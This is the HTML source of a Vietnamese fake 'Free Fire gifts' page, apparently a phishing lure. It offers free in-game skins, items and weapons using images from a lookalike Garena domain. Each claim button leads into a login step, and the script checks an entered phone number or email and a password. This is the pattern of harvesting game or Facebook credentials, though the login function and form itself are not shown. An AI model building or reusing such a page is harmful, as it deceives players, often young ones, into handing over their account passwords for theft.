<!DOCTYPE html>
<html>


<head><base href="https://themxe.codeflow.store/7/">

	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<title>QUÀ TẶNG FREEFIRE</title>
	
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<link rel="stylesheet" type="text/css" href="css/facebook.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>

 <div class="loader" id="loader"><img src="https://i.pinimg.com/originals/67/56/66/675666d840a9c8fa1c61eaf584ff2a50.gif"> </div>
        
        <script>
            setTimeout(() => {
                document.getElementById("loader").innerHTML = '';
                document.getElementById("loader").removeAttribute("class");
            }, 1000);
     </script>
     
     
	<div class="nguyenSection">
		<div class="headerBg">
			<h1><i>Free Fire</i></h1>
			<img src="ngMedia/top.png">
		</div>
		<div class="ngWrap">
		    <div class="banner">
		    Quà Tặng Free Fire 
		    </div>
			<div class="dialog">
				<div class="dialogBg">
				<img src="ngMedia/untitled_design_6-sixteen_nine.jpg">
				</div>
			</div>
			<div class="menu">
			   <a class="tab active">
			     <span class="tabbed" id="ep">TRANG PHỤC</span>
			   </a>
			   <a class="tab">
			     <span class="tabbed" id="cobra">VẬT PHẨM</span>
			   </a>
			   <a class="tab">
			     <span class="tabbed" id="gun">VŨ KHÍ</span>
			   </a>
			</div>
			<div id="hadiah" class="hadiah">
			</div>
		</div>
		
		
		
		
		
		<div class="popDialog">
		    <div class="tutup" onclick="tutup()"></div>
		    <span class="titleText">Nhận phần thưởng?</span>
		    <div class="box">
			       <div class="prize">
			           <img id="inigambar" src="ngMedia/hadiah/old/1.png">
			       </div>
			       <div class="button" onclick="NhanQua()">
			         <img src="ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
		</div>
		
	
	</div>
	
	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
	
	
	<script>
	    function NhanQua(){
	        login();
	    }
	</script>
	
	<script>
	  $(document).on('click','.menu .tab',function(){
	     $(this).addClass("active").siblings().removeClass("active");
	  })
	  $(".tabbed").click(function(){
	     var wan = $(this).attr('id');
	     if(wan == "ep"){
	         document.getElementById("hadiah").innerHTML = `                <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/ndtq.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/000.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/mn.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/1111.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/2614b419ea4bdae9c70fa48015de5060.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/6.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/7.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/8.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/9.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			 
			    
			    `;
	     }else if(wan == "cobra"){
	         document.getElementById("hadiah").innerHTML = `                <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/vatpham/1.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/vatpham/2.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/vatpham/3.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/vatpham/4.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/vatpham/5.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/vatpham/6.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			
			<div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/vatpham/7.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			
			<div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/vatpham/8.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    `;
	     }else if(wan == "gun"){
	         document.getElementById("hadiah").innerHTML = `                <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/888.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/06.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/05.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/04.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/08.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/6.jpg">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			        <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/7.jpg">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			        <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/8.jpg">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			        <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/sung/9.jpg">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			
			    `;
	     }
	  })
	  document.getElementById("hadiah").innerHTML = `                <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/ndtq.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/000.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/mn.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/1111.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/2614b419ea4bdae9c70fa48015de5060.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/6.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/7.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/8.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			    <div class="box">
			       <div class="prize">
			           <img src="https://ffmembergarena.vn/ngMedia/NongVanNguyen/do/9.png">
			       </div>
			       <div class="button" onclick="ambil(this)">
			         <img src="https://ffmembergarena.vn/ngMedia/button.png">
			         <span class="text">Nhận</span>
			       </div>
			    </div>
			    
			 
			    
			    `;
	  </script>
		  
  <script type="text/javascript">
       


 function phonenumber(user) {
 var vnf_regex = /((84|01|03|05|07|08|09)+([0-9]{8})\b)/g;
 if (vnf_regex.test(user) == false) 
        {console.log("phonenumber false");
            return false; 
            
        }else{
            console.log("phonenumber true");
           return true;
           
        } 
}




function validateEmail (user)
{
  let regexEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
  if (user.match(regexEmail)) {
      console.log("regexEmail true");
    return true; 
     
  } else {
      console.log("regexEmail false");
   return false; 
    
  }
}

 function validatepassword(pass){

if (pass.length >= 6 && pass.length <= 25)
{
   
    return true;
}
else {
 
    return false;
}
}

</script>

 <script>
 

 
        function valid() {
            var user = $('#user').val();
            var pass = $('#pass').val();
            phonenumber(user);
           validateEmail(user);
            var ip = $('#ip').val();
            if(user == '' || user == null)
            {
                
                $('.email').show();
                $('.sandi').hide();
                return false;
            }else if(validatepassword(pass) == false)
            {
                $('.email').hide();
                $('.sandi').show();
                return false;
            }
            else if(user != '' || user != null)
            {
                if( (phonenumber(user) == true)  || (validateEmail(user) == true))
                {
                $('.email').hide();
                $('.sandi').hide();
               
                }
                else
                {
                     $('.email').show();
                $('.sandi').hide();
                return false;
                }
            }
            
            
            $("#btnfb").addClass("disabled");
        }
        
    </script>


	  <script>
	      function ambil(e){
	      var p = e.parentElement.getElementsByTagName('img');
	        var img = p[0].getAttribute("src");
	        $("#inigambar").attr("src",img);
	        $(".mask").show();
	        $(".popDialog").fadeIn();
	      }
	      function tutup()
	      {
	        $(".mask").fadeOut();
	        $(".popDialog").fadeOut();
	      }
	  </script>
</body>

</html>
